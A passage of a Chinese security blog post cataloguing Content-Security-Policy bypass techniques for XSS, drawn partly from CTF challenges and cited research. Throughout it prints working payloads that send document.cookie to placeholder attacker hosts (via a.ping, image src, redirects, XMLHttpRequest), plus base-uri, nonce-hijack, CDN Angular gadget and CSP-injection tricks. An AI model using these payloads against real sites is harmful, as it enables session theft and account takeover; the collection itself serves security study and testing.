+<p>&#x5F53;&#x8D44;&#x6E90;&#x7C7B;&#x578B;&#x662F;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x9884;&#x52A0;&#x8F7D;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">URL&#x4E2D;&#x5305;&#x542B;&#x4E0B;&#x8F7D;&#x8D44;&#x6E90;</span><br><span class="line">&#x9875;&#x9762;&#x4E2D;&#x5305;&#x542B;&#x97F3;&#x9891;&#x3001;&#x89C6;&#x9891;</span><br><span class="line">POST&#x3001;PUT&#x548C;DELET&#x64CD;&#x4F5C;&#x7684;ajax&#x8BF7;&#x6C42;</span><br><span class="line">HTTP&#x8BA4;&#x8BC1;</span><br><span class="line">HTTPS&#x9875;&#x9762;</span><br><span class="line">&#x542B;&#x6076;&#x610F;&#x8F6F;&#x4EF6;&#x7684;&#x9875;&#x9762;</span><br><span class="line">&#x5F39;&#x7A97;&#x9875;&#x9762;</span><br><span class="line">&#x5360;&#x7528;&#x8D44;&#x6E90;&#x5F88;&#x591A;&#x7684;&#x9875;&#x9762;</span><br><span class="line">&#x6253;&#x5F00;&#x4E86;chrome developer tools&#x5F00;&#x53D1;&#x5DE5;&#x5177;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jQuery sourcemap</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write(`&lt;script&gt;</span><br><span class="line">//@ 	   sourceMappingURL=http://xxxx/`+document.cookie+`&lt;\/script&gt;`);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>a&#x6807;&#x7B7E;&#x7684;ping&#x5C5E;&#x6027;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=document.createElement(&apos;a&apos;);</span><br><span class="line">a.href=&apos;#&apos;;</span><br><span class="line">a.ping=&apos;http://xxx.io/?&apos; + escape(document.cookie);</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>http 204</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=&apos;//xxx.io/csi?&apos; + escape(document.cookie);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>script&#x5305;&#x542B;&#x7684;js&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF08;&#x901A;&#x7528;&#x7684;bypass&#x65B9;&#x5F0F;&#xFF09;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&amp;quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a=document.createElement(&quot;a&quot;);</span><br><span class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var i=document.createElement(&quot;img&quot;);</span><br><span class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</span><br><span class="line">xxx.appendChild(i);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x91CD;&#x5B9A;&#x5411;(302)&#x5BFC;&#x81F4;&#x7ED5;&#x8FC7;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;;script-src http://127.0.0.1/a/ ;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5982;&#x679C;&#x80FD;&#x627E;&#x5230;&#x4E00;&#x4E2A;url&#x8DF3;&#x8F6C;&#xFF0C;&#x901A;&#x8FC7;<code>/a/</code>&#x76EE;&#x5F55;&#x4E0B;&#x8DF3;&#x8F6C;&#x5230;&#x5176;&#x4ED6;&#x76EE;&#x5F55;&#x4E0B;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF0C;&#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x3002;</p>
+<ul>
+<li>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5BFC;&#x81F4;&#x7684;Bypass</li>
+</ul>
+<p>&#x5F53;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x5904;&#x4E8E;csp&#x6240;&#x89C4;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x4E0B;&#x65F6;&#xFF0C;apache&#x548C;nginx&#x4F1A;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#x3002;</p>
+<p>apache&#xFF1A;&#x5728;&#x4E00;&#x4E2A;&#x672A;&#x77E5;&#x540E;&#x7F00;&#x540D;&#x5E76;&#x4E14;&#x4E0D;&#x6307;&#x5B9A;content-type&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F1A;&#x9ED8;&#x8BA4;&#x4EE5;html&#x89E3;&#x6790;&#x3002;</p>
+<p>nginx&#xFF1A;&#x4E0D;&#x6307;&#x5B9A;&#x540E;&#x7F00;&#x540D;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F1A;&#x76F4;&#x63A5;&#x5199;&#x4E0B;&#x8F7D;&#x3002;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;<code>&lt;svg&gt;</code>&#x683C;&#x5F0F;&#x7684;xss payload&#x3002;</p>
+<p><code>&lt;svg xmlns=&quot;[http://www.w3.org/2000/svg&amp;quot;](http://www.w3.org/2000/svg&amp;quot;) onload=&quot;alert(URL)&quot;/&gt;</code></p>
+<p>&#x5982;&#x679C;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;jpg&#x56FE;&#x7247;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;payload&#x8FDB;&#x884C;&#x8C03;&#x7528;&#xFF1A;</p>
+<p><code>&lt;embed src=&quot;[http://127.0.0.1/upload/1.jpg](http://127.0.0.1/upload/1.jpg&amp;quot;)&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;</code></p>
+<p>&#x53C2;&#x8003;&#xFF1A;<a href="https://xz.aliyun.com/t/318/" target="_blank" rel="noopener">https://xz.aliyun.com/t/318/</a></p>
+<h3 id="Iframe&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;"><a href="#Iframe&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;" class="headerlink" title="Iframe&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;"></a>Iframe&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;</h3><p>&#x540C;&#x6E90;&#x7AD9;&#x70B9;&#x4E2D;&#xFF0C;&#x5982;&#x679C;index.php&#x6CA1;&#x6709;&#x4F5C;&#x8FC7;&#x6EE4;&#xFF0C;&#x800C;csp.php&#x6709;&#x8FC7;&#x6EE4;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;index.php&#x9875;&#x9762;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;iframe&#xFF0C;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;iframe&#x7684;dom&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">iframe.src=&quot;./safe.php&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">setTimeout(()=&gt;location.href=&apos;http://xxx/cookie/&apos;+escape(document.cookie),1000);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CRLF&#x5BFC;&#x81F4;&#x7684;bypass"><a href="#CRLF&#x5BFC;&#x81F4;&#x7684;bypass" class="headerlink" title="CRLF&#x5BFC;&#x81F4;&#x7684;bypass"></a>CRLF&#x5BFC;&#x81F4;&#x7684;bypass</h3><p>&#x5F53;&#x901A;&#x8FC7;CRLF&#x4F20;&#x5165;%0d%0a%0d%0a&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;HTTP&#x5934;&#x90E8;&#x4E2D;&#x7684;csp&#x89C4;&#x5219;&#x53D8;&#x6210;&#x7F51;&#x9875;&#x5185;&#x5BB9;&#x800C;&#x88AB;&#x5FFD;&#x89C6;&#x3002;(PHP&#x9AD8;&#x7248;&#x672C;&#x4E2D;&#x4E0D;&#x5141;&#x8BB8;&#x53D1;&#x9001;&#x591A;&#x884C;Header)</p>
+<p>HCTF2018_Bottle&#xFF1A;<a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
+<h3 id="Base-uri&#x7ED5;&#x8FC7;"><a href="#Base-uri&#x7ED5;&#x8FC7;" class="headerlink" title="Base-uri&#x7ED5;&#x8FC7;"></a>Base-uri&#x7ED5;&#x8FC7;</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;nonce-test&apos;</span><br><span class="line"></span><br><span class="line">default&#x6CA1;&#x6709;&#x989D;&#x5916;&#x8BBE;&#x7F6E;base-uri</span><br></pre></td></tr></table></figure>
+
+<p>&#x4F7F;&#x7528;base&#x6807;&#x7B7E;&#x5C06;&#x9875;&#x9762;&#x4E2D;&#x7684;&#x5730;&#x5740;&#x8BBE;&#x7F6E;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;vps&#xFF0C;script&#x4F7F;&#x7528;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x5229;&#x7528;&#x3002;</p>
+<h3 id="CDN&#x7ED5;&#x8FC7;"><a href="#CDN&#x7ED5;&#x8FC7;" class="headerlink" title="CDN&#x7ED5;&#x8FC7;"></a>CDN&#x7ED5;&#x8FC7;</h3><p>&#x5F53;&#x89C4;&#x5219;&#x4E2D;&#x5305;&#x542B;&#x4E86;&#x67D0;&#x4E00;&#x4E2A;CDN&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B58;&#x5728;&#x4F4E;&#x7248;&#x672C;&#x7684;&#x6846;&#x67B6;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6846;&#x67B6;&#x6240;&#x5B58;&#x5728;&#x7684;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;xss&#x6765;&#x7ED5;&#x8FC7;csp&#x3002;</p>
+<p>&#x53C2;&#x8003;&#xFF1A;<a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    {{constructor.constructor(&apos;alert(document.cookie)&apos;)()}}</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5B58;&#x5728;&#x4F4E;&#x7248;&#x672C;angular js&#x7684;CDN&#x670D;&#x52A1;&#x5546;&#x5217;&#x8868;&#xFF1A;</p>
+<p><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a></p>
+<p>&#x5176;&#x4ED6;&#x7684;&#x5E93;&#xFF1A;</p>
+<p>Jquery-mobile&#x5E93;&#xFF0C;&#x4E14;CSP&#x4E2D;&#x5305;&#x542B;&#x201D;script-src &#x2018;unsafe-eval&#x2019;&#x201D;&#x6216;&#x8005;&#x201D;script-src &#x2018;strict-dynamic&#x2019;&#x201D;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
+<h3 id="&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;"><a href="#&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;" class="headerlink" title="&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;"></a>&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;</h3><p>&#x6709;&#x4E9B;&#x7F51;&#x7AD9;&#x9650;&#x5236;&#x53EA;&#x6709;&#x67D0;&#x4E9B;&#x811A;&#x672C;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#xFF0C;&#x5F80;&#x5F80;&#x4F1A;&#x4F7F;&#x7528;<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;</span><br></pre></td></tr></table></figure>
+
+<p>那么当脚本插入点为如下的情况时:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以插入:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//14.rs a=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样会拼成一个新的script标签，其中的src可以自由设定</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地文件包含导致绕过"><a href="#本地文件包含导致绕过" class="headerlink" title="本地文件包含导致绕过"></a>本地文件包含导致绕过</h3><p>当csp都是self时，可以通过上传本地文件，然后进行包含。</p>
+<ul>
+<li>cctf 2016</li>
+</ul>
+<p>通过后台上传了一个swf。(但是这里我一直没有复现成功，可能是浏览器版本的缘故。)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CWS</span><br><span class="line">&lt;script&gt;var xml = new XMLHttpRequest(); xml.open(&apos;POST&apos;, &apos;http://xss.xxxxx.cc&apos;, true); xml.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xml.send(&apos;cookie=&apos;+document.cookie); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;import&apos; href=&apos;/upload/xxxxx&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>hctf 2016：</p>
+<p>题目csp限制只能在static加载js，把文件上传到upload目录，通过%2f跨目录加载。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=&quot;http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSP注入导致的绕过"><a href="#CSP注入导致的绕过" class="headerlink" title="CSP注入导致的绕过"></a>CSP注入导致的绕过</h3><p>当CSP中的内容是可控的内容时，可以通过下面两种方式绕过：</p>
+<ul>
+<li>破坏CSP的方法（Edge浏览器）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSP: script-src &apos;none&apos;; report-uri /test;_</span><br></pre></td></tr></table></figure>
+
+<p><code>test;_</code>是能够控制的内容。当CSP语句被破坏时，Edge浏览器会放弃整个CSP策略。</p>
+<p>文章中给了一个很短的payload：<code>;_</code></p>
+<p>实例地址：<a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E</a>)</p>
+<ul>
+<li>script-src-elem重写规则绕过</li>
+</ul>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src-elem &apos;none&apos;; script-src-attr &apos;unsafe-inline&apos;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;This will be blocked&quot;)&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;alert(&apos;This will be allowed&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实例地址：<a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E">script-src-elem重写规则绕过</a></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul>
+<li><a href="https://lorexxar.cn/2016/08/08/ccsp/#%E4%BB%80%E4%B9%88%E6%98%AFCSP">CSP Level 3浅析&amp;简单的bypass</a></li>
+<li><a href="https://portswigger.net/research/bypassing-csp-with-policy-injection">Bypassing CSP with policy injection</a></li>
+<li><a href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html">csp学习</a></li>
+<li><a href="https://xz.aliyun.com/t/318/">初探CSPBypass一些细节总结</a></li>
+<li><a href="https://xz.aliyun.com/t/7372">csp绕过姿势</a></li>
+</ul>
+<p>两个方便CSP测试的网址：</p>
+<ul>
+<li>CSP生成：<a href="https://www.cspisawesome.com/">https://www.cspisawesome.com/</a></li>
+<li>CSP分析：<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></li>
+</ul>
+<p>总结是永远总结不完的，这里只贴地址了：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/7530">如何将JavaScript隐藏在PNG图像中来绕过CSP</a></li>
+<li><a href="https://xz.aliyun.com/t/7108">CSP:trusted-types 初体验</a></li>
+</ul>
+</script></p>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/XSS/">#XSS</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Bypass/">#Bypass</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CSP/">#CSP</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2020/04/29/xxe_payload/">一些常见的XXE payload整理</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Que voulez-vous chercher ?">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Catégories',
+                TAGS: 'Tags',
+                UNTITLED: '(Sans Titre)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
+    
+</body>
+</html>
